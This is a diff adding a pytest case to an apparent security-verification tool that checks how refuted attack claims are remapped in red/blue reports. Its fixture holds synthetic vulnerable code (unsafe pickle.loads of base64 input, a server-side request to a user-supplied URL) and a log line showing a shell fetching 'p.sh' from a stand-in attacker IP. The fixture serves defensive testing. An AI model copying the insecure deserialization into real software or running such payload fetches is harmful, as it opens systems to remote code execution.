@@ -537,4 +537,39 @@ def test_patch_verification_multi_route_surface_isolation_and_new_threat_preserv
     # Patch keeping both sinks on a single line (1 EV record) + verifying Verifier verdict threshold
     assert one_line_chain.verdict.verdict == VerdictType.CONFIRMED_ATTACK
 
+    # 4) Candidate containing BOTH active claims (CLM-01, CLM-02) AND a refuted claim colliding on CLM-03
+    #    must remap the refuted claim (CLM-04) so no step or contradiction ever points to omitted CLM-03 (T1611)
+    vuln_for_refuted_merge = assistant.analyze_scenario("scen-03-sqli-ssrf-code-chain")
+    mixed_with_refuted = "\n".join([
+        '@app.get("/api/v1/export")',
+        'def export_customer_report(tenant_id: str, webhook_url: str):',
+        '    rows = db.execute("SELECT id, webhook_url FROM reports WHERE tenant_id = ?", (tenant_id,)).fetchall()',
+        '    validate_https_public_allowlist(webhook_url)',
+        '    return requests.get(webhook_url, timeout=3, allow_redirects=False).text',
+        '2026-11-17T02:02:01Z host=web-dbg-02 src=198.51.100.99 method=POST /api/v2/session/restore waf_status=ALLOWED',
+        'def restore_blob(b): return pickle.loads(base64.b64decode(b))',
+        '2026-11-17T02:02:03Z host=web-dbg-02 parent_proc=python3 proc=sh cmd="sh -c curl http://198.51.100.99/p.sh"',
+        '2026-11-17T02:01:08Z host=srv-backup-09 actor=svc_bak proc=borgbackup writes_enc_ext=1400',
+        '2026-11-17T02:01:13Z host=srv-backup-09 auth=ChangeControl ticket=CHG-99 status=ACTIVE',
+        '2026-11-17T02:01:14Z host=srv-backup-09 proc=borgbackup signature_verified=true sha256_trusted=true',
+        '2026-11-17T02:01:15Z host=srv-backup-09 zone=AUTHORIZED_BACKUP_VLAN ransomware_note=false vss_deleted=false',
+    ])
+    res_ref = assistant.verify_case_update(
+        case_id=vuln_for_refuted_merge.case_id,
+        mode="verify_patch",
+        content=mixed_with_refuted,
+    )
+    claims_by_id = {c.claim_id: c for c in res_ref.red_report.claims}
+    assert res_ref.verdict.diagnosis.refuted_claims_count >= 1
+    for step in res_ref.red_report.kill_chain:
+        assert step.claim_id in claims_by_id
+        assert step.tactic == claims_by_id[step.claim_id].tactic
+    for contra in res_ref.blue_report.contradictions:
+        if contra.target_claim_id:
+            assert contra.target_claim_id in claims_by_id
+            if contra.impact_on_hypothesis == "refutes":
+                assert claims_by_id[contra.target_claim_id].status == "refuted"
+                assert claims_by_id[contra.target_claim_id].technique_id != "T1611"
+
+
 
